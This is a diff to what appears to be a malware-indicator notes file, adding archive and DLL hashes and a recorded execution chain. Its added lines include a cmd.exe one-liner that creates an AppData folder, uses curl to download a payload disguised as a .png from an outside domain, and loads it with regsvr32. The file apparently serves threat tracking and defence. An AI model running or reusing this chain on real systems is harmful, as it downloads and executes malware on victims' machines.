@@ -2,8 +2,20 @@
 
 *************************************************
 
+.zip cb1120370791c6f6e53aaf96b9f4468c1e26802028535c2265db245771fa8812 - E98346
+.dll 8d705dcd0ae231b77f5079df18049f76848613c41a45d8f54015b40cf65aebeb
+
+*************************************************
+
+Exec >>
+
+cmd /c C:\Users\Admin\AppData\Local\Temp\Infrmation\Inf776.lnk
+
+cmd.exe" /q /c echo 'Wd' && MD "C:\Users\Admin\AppData\Roaming\dd" && curl.exe -o C:\Users\Admin\AppData\Roaming\dd\v8m_X.Y9Tm.fOdH https://altosieg.com/10Mh/D2.png && echo "Ol" && ping hE.com && regsvr32 "C:\Users\Admin\AppData\Roaming\dd\v8m_X.Y9Tm.fOdH" && echo "cW"
+
+*************************************************
+
 .zip 35daac20102fc39160f38318fe83ed84fba1dfb742956e63b2cabc1f630ab7d1 - E98346
-.lnk F2C736C4B8A82858E06DFFCB08B2D22D2D9D36A7FF92FAE2812FC14D16234E10
 .dll f69a98d9d3851aa7bcdfc2ea6bce41fe8ce5ab654974dd9eaa037c074a0af235
 
 *************************************************
